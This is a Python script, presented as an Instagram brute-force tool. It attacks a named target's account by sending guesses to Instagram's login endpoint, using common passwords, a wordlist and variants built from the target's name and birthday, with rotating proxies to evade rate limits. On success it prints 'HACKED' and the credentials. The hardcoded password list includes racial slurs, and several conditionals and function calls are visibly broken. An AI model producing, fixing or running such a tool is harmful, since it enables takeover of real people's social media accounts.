import os
import requests
import random
from threading import Thread, Lock
import time
from colorama import init,Fore
from datetime import datetime
import json

init()

def clear():
    if os.name == 'posix':
        os.system('clear')
    elif os.name in ('ce', 'nt', 'dos'):
        os.system('cls')
    else:
        print("\n") * 120

def SetTitle(title_name:str):
    os.system("title {0}".format(title_name))


basic_passwords = ['qwerty123','123456','1234567','12345678','123456789','1234567890','qwerty','qwertyuiop','password','Password','passw0rd','Passw0rd','Password1','password1','iloveyou','ILOVEYOU','111111','123123','Nothing','nothing','Secret','Admin','abc123','monkey','dragon','baseball','master','sunshine','ashley','bailey','shadow','superman','Football','football','cristiano','cristiano7','ronaldo7','cristianoronaldo','cristianoronaldo7','ronaldocristiano','ronaldocristiano7','instagram123','google','yourmom','nigger123','nigga123','hello123','hello1337']

whitelist = ['your_insta_name','your_insta_name2']

SetTitle('One Man Builds Instagram Bruteforce Tool')
clear()
retry_time = int(input('[QUESTION] Enter the ratelimit retry time: '))
waiting_time = int(input('[QUESTION] Enter the waiting time between requests: '))


def ReadFile(filename,method):
    with open(filename,method) as f:
        content = [line.strip('\n') for line in f]
        return content

def PrintText(info_name,text,info_color:Fore,text_color:Fore):
    print(f'[{info_color+info_name+Fore.RESET}] '+text_color+f'{text}')

def GetRandomBasicPassword():
    return random.choice(basic_passwords)

def AppendBasicToPassword(password:str):
    return password+random.choice(basic_passwords)

def AppendBirthdayToPassword(password:str,birthday:str):
    return password+birthday

def UpperOrLower(text:str):
    choice = random.randint(0,1)
    if choice == 0:
        return text.lower()
    else:
        return text.upper()

def GetSpecificInfoList(username:str,firstname:str,lastname:str,birthday:str):
    specific_info = [username,firstname,lastname,birthday]
    return specific_info

def AppendRandomSpecificInfo(username:str,firstname:str,lastname:str,birthday:str,password:str):
    return password+random.choice(GetSpecificInfoList(username,firstname,lastname,birthday,password))

def GetAnswers():
    check_basic_passwords_only = int(input('[QUESTION] Would you like to check basic passwords only [1] yes [0] no: '))
    append_basic_password = int(input('[QUESTION] Would you like to add a random basic password at the end of the password [1] yes [0] no: '))
    append_birthday_password = int(input('[QUESTION] Would you like to add the birthday at the end of the password [1] yes [0] no: '))
    random_upper = int(input('[QUESTION] Would you like to make the passwords random uppercase or lower [1] yes [0] no: '))
    append_random_specific_info = int(input("[QUESTION] Would you like to add some specific info at the end of the password [1] yes [0] no: "))
    specific_data_variations_only = int(input("[QUESTION] Check only username, firstname, lastname, birthday variations [1] yes [0] no: "))

    return [check_basic_passwords_only,append_basic_password,append_birthday_password,random_upper,append_random_specific_info,specific_data_variations_only]

def GetRandomProxy():
    proxies_file = ReadFile('proxies.txt','r')
    proxies = {
        "http":"http://{0}".format(random.choice(proxies_file)),
        "https":"https://{0}".format(random.choice(proxies_file))
        }
    return proxies

def login_instagram(username, password,use_proxy:int):
    link = 'https://www.instagram.com/accounts/login/'
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    curtime = int(datetime.now().timestamp())

    get_headers = {
        "cookie": "ig_cb=1" #if this cookie header is missing you will receive cookie errors
    }

    response = requests.get(link,headers=get_headers)

    csrf = response.cookies['csrftoken']

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{curtime}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    login_response = ''

    PrintText('INFO','Waiting {0}s before the request.'.format(waiting_time),Fore.YELLOW,Fore.WHITE)

    time.sleep(waiting_time)

    if use_proxy == 1:
        login_response = requests.post(login_url, data=payload, headers=login_header,proxies=GetRandomProxy())
    else:
        login_response = requests.post(login_url, data=payload, headers=login_header)

    json_data = json.loads(login_response.text)
    #print(json_data)
    #print(json_data)
    
    if 'authenticated' in json_data:
        if json_data['authenticated'] == True:
            PrintText('HACKED','{0}:{1}'.format(username,password),Fore.GREEN,Fore.WHITE)
            os.system('pause >NUL')
            #cookies = login_response.cookies
            #cookie_jar = cookies.get_dict()
            #csrf_token = cookie_jar['csrftoken']
            #print("csrf_token: ", csrf_token)
            #session_id = cookie_jar['sessionid']
            #print("session_id: ", session_id)
        elif json_data['status'] == 'fail':
            PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
            time.sleep(retry_time)
            PrintText('ERROR','Retrying the request with proxy',Fore.RED,Fore.WHITE)
            login_instagram(username,password,1)
        else:
            PrintText('ERROR','{0}:{1} -> failed to login'.format(username,password),Fore.RED,Fore.WHITE)
    elif json_data['status'] == 'fail':
            PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
            time.sleep(retry_time)
            PrintText('ERROR','Retrying the request with proxy',Fore.RED,Fore.WHITE)
            login_instagram(username,password,1)
    else:
        PrintText('ERROR','{0}:{1} -> {2}'.format(username,password,json_data['message']),Fore.RED,Fore.WHITE)

def Brute(answers,username,password,firstname='',lastname='',birthday=''):
    if (answers[1] == 1) and (answers[2] == 1) and (answers[3] == 1) and (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendBasicToPassword(password)
            password = AppendBirthdayToPassword(password,birthday)
            password = AppendRandomSpecificInfo(username,firstname,lastname,birthday,password)
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass

    if (answers[0] == 1) and (answers[2] == 1) and (answers[3] == 1) and (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendBirthdayToPassword(password,birthday)
            password = AppendRandomSpecificInfo(username,firstname,lastname,birthday,password)
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass


    if (answers[0] == 1) and (answers[1] == 0) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 0):
        try:
            login_instagram(username,password)
        except:
            pass

    if (answers[0] == 1) and (answers[1] == 1) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 0):
        PrintText('ERROR','You can not append basic password to the basic passwords',Fore.RED,Fore.WHITE)

    if (answers[0] == 1) and (answers[1] == 0) and (answers[2] == 1) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = AppendBirthdayToPassword(password)
            login_instagram(username,password)
        except:
            pass


    if (answers[0] == 1) and (answers[2] == 0) and (answers[3] == 1) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass


    if (answers[0] == 1) and (answers[1] == 0) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendRandomSpecificInfo(username,firstname,lastname,birthday,password)
            login_instagram(username,password)
        except:
            pass


    if (answers[1] == 1) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = AppendBasicToPassword(password)
            login_instagram(username,password)
        except:
            pass


    if (answers[1] == 1) and (answers[2] == 1) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = AppendBasicToPassword(password) + AppendBirthdayToPassword(password,birthday)
            login_instagram(username,password)
        except:
            pass


    if (answers[1] == 1) and (answers[2] == 0) and (answers[3] == 1) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = AppendBasicToPassword(password)
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass


    if (answers[1] == 1) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendBasicToPassword(password)
            password = AppendRandomSpecificInfo(username,firstname,lastname,birthday,password)
            login_instagram(username,password)
        except:
            pass

    
    if (answers[0] == 0) and (answers[1] == 0) (answers[2] == 1) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = AppendBirthdayToPassword(password,birthday)
            login_instagram(username,password)
        except:
            pass

    if (answers[0] == 0) and (answers[1] == 0) (answers[2] == 1) and (answers[3] == 1) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = AppendBirthdayToPassword(password,birthday)
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass

    if (answers[0] == 0) and (answers[1] == 0) (answers[2] == 1) and (answers[3] == 0) and (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendBirthdayToPassword(password,birthday)
            password = AppendRandomSpecificInfo(username,fistname,lastname,birthday,password)
            login_instagram(username,password)
        except:
            pass
  
    if (answers[0] == 0) and (answers[1] == 0) and (answers[2] == 0) (answers[3] == 1) and (answers[4] == 0) and (answers[5] == 0):
        try:
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass

    if (answers[0] == 0) and (answers[1] == 0) and (answers[2] == 0) (answers[3] == 1) and (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendRandomSpecificInfo(username,firstname,lastname,birthday,password)
            password = UpperOrLower(password)
            login_instagram(username,password)
        except:
            pass

    if (answers[0] == 0) and (answers[1] == 0) and (answers[2] == 0) and (answers[3] == 0) (answers[4] == 1) and (answers[5] == 0):
        try:
            password = AppendRandomSpecificInfo(username,firstname,lastname,birthday,password)
            login_instagram(username,password)
        except:
            pass



def GetRandomBirthdayNum(birthday:str):
    birthday = birthday.split('.')
    return random.choice(birthday)


#def GenerateSpecificCredential(username,password,firstname,lastname,birthday):
#    data = [username,password,firstname,lastname,birthday]

#    random_data_max = random.randint(1,len(data))

#    results = []

#    for i in range(random_data_max):
#        results.append(UpperOrLower(data[i]))

#    return results


def StartBruteSpecificInfo(username,password):
    try:
        login_instagram(username,password,0)
    except:
        pass
    
    
def GenerateSpecificCredential(username,password,firstname,lastname,birthday):
    passwords_list = [username,password,firstname,lastname,birthday]
    amount_to_add = random.randint(0,len(passwords_list))
    if amount_to_add == 0:
        return ''.join(random.choice(passwords_list)+random.choice(passwords_list))
    elif amount_to_add == 1:
        return ''.join(random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list))
    elif amount_to_add == 2:
        return ''.join(random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list))
    elif amount_to_add == 3:
        return ''.join(random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list))
    elif amount_to_add == 4:
        return ''.join(random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list)+random.choice(passwords_list))
    elif amount_to_add == 5:
        return random.choice(passwords_list)

def StartBrute():
    lock = Lock()
    passwords = ReadFile('password_list.txt','r')

    firstname = ''
    lastname = ''
    birthday = ''

    username = str(input("[QUESTION] Enter the target's username: "))

    if username not in whitelist:
        answers = GetAnswers()
        print('')
        if answers[4] == 1:
            firstname = str(input("[QUESTION] Enter the firstname: "))
            lastname = str(input("[QUESTION] Enter the lastname: "))
            birthday = str(input("[QUESTION] Enter the birthday (date.month.day): "))
            print('')
        if answers[0] == 1:
            for password in basic_passwords:
                lock.acquire()
                Thread(target=Brute(answers,username,password,firstname=firstname,lastname=lastname,birthday=birthday))
                lock.release()
        elif (answers[0] == 0 and answers[1] == 1 or answers[2] == 1 or answers[3] == 1 or answers[4] == 1) and (answers[5] == 0):
            for password in passwords:
                lock.acquire()
                Thread(target=Brute(answers,username,password,firstname=firstname,lastname=lastname,birthday=birthday))
                lock.release()

        if (answers[0] == 0) and (answers[1] == 0) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 1):
            guessed_password = str(input('[QUESTION] Enter the password here which you think can be right: '))
            random_birthday_date = int(input('[QUESTION] Would you like to randomize the birthday for example check the day month year separated [1] yes [0] no: '))
            firstname = str(input("[QUESTION] Enter the target's firstname: "))
            lastname = str(input("[QUESTION] Enter the target's lastname: "))
            birthday = str(input("[QUESTION] Enter the target's birthday (date.month.day): "))
            print('')
            if random_birthday_date == 1:
                while True:
                    password = GenerateSpecificCredential(username,guessed_password,firstname,lastname,GetRandomBirthdayNum(birthday))
                    lock.acquire()
                    Thread(target=StartBruteSpecificInfo(username,password))
                    lock.release()
            else:
                while True:
                    password = GenerateSpecificCredential(username,guessed_password,firstname,lastname,birthday)
                    lock.acquire()
                    Thread(target=StartBruteSpecificInfo(username,password))
                    lock.release()
    else:
        PrintText('WHITELIST','You can not check this user',Fore.RED,Fore.WHITE)


if __name__ == "__main__":
    PrintText('IMPORTANT','If you want to use only the last option please add proxies to the proxies.txt',Fore.YELLOW,Fore.WHITE)
    StartBrute()